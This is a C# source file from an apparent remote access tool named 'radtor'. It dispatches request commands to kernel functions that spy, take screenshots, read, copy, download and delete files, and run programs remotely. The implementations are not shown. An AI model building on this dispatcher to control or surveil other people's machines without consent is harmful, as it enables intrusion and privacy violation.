using LocalRT.radtor.local.core;
using LocalRT.radtor.local.web;
using System;

namespace LocalRT.radtor.local.core
{
    class RTCommand
    {
        private Kernel kernel;

        public const string CMD_ALO = "ALO";
        public const string CMD_SPY = "SPY";
        public const string CMD_DEL = "DEL";
        public const string CMD_PRO = "PRO";
        public const string CMD_DWN = "DWN";
        public const string CMD_SCR = "SCR";
        public const string CMD_REA = "REA";
        public const string CMD_RUN = "RUN";
        public const string CMD_SHW = "SHW";
        public const string CMD_IMG = "IMG";
        public const string CMD_XCP = "XCP";


        public string Response { get; set; }
        
        public String execute(RTRequest radtorRq)
        {
            if (kernel == null)
            {
                kernel = new Kernel();
            }
            try
            {
                switch (radtorRq.cmd)
                {
                    case CMD_ALO:
                        Response = kernel.sayHi(radtorRq);
                        break;
                    case CMD_SPY:
                        Response = kernel.spy(radtorRq);
                        break;
                    case CMD_DEL:
                        Response = kernel.delete(radtorRq);
                        break;
                    case CMD_PRO:
                        Response = kernel.process(radtorRq);
                        break;
                    case CMD_DWN:
                        Response = kernel.download(radtorRq);
                        break;
                    case CMD_SCR:
                        Response = kernel.screenshot(radtorRq);
                        break;
                    case CMD_REA:
                        Response = kernel.readFile(radtorRq);
                        break;
                    case CMD_RUN:
                        Response = kernel.execute(radtorRq);
                        break;
                    case CMD_SHW:
                        Response = kernel.show(radtorRq);
                        break;
                    case CMD_IMG:
                        Response = kernel.showImg(radtorRq);
                        break;
                    case CMD_XCP:
                        Response = kernel.copy(radtorRq);
                        break;
                }
            }
            catch (Exception e)
            {
                Response = "Error " + e.Message;
            }
            return Response;
        }
    }
}
